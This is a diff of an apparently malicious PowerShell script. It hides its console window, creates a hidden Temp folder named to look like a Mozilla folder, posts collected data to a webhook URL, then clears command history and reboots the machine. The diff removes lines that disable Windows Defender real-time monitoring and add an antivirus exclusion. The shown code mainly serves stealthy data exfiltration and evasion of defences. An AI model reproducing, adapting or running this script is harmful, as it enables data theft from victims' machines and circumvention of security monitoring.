@@ -68,14 +68,12 @@ public static extern bool SetForegroundWindow(IntPtr hWnd);
         }
     }
 }
-
 Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'
-Set-MpPreference -DisableRealtimeMonitoring $true
 Get-Process -ID $PID | Set-WindowState -State HIDE
+
 #TEMP location
 $dir = "C:\Users\$env:UserName\AppData\Local\Temp\mozilla-temp-fiIes"
 New-Item -ItemType Directory -Path $dir
-Add-MpPreference -ExclusionPath $dir
 $hide = Get-Item $dir -Force
 $hide.attributes='Hidden'
 
@@ -102,8 +100,6 @@ Invoke-WebRequest -Uri $webhookUrl -Method POST -Body $JsonBody -ContentType "ap
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
-Set-MpPreference -DisableRealtimeMonitoring $false
-Remove-MpPreference -ExclusionPath $dir
 Clear-History
 
 # Reboot the system
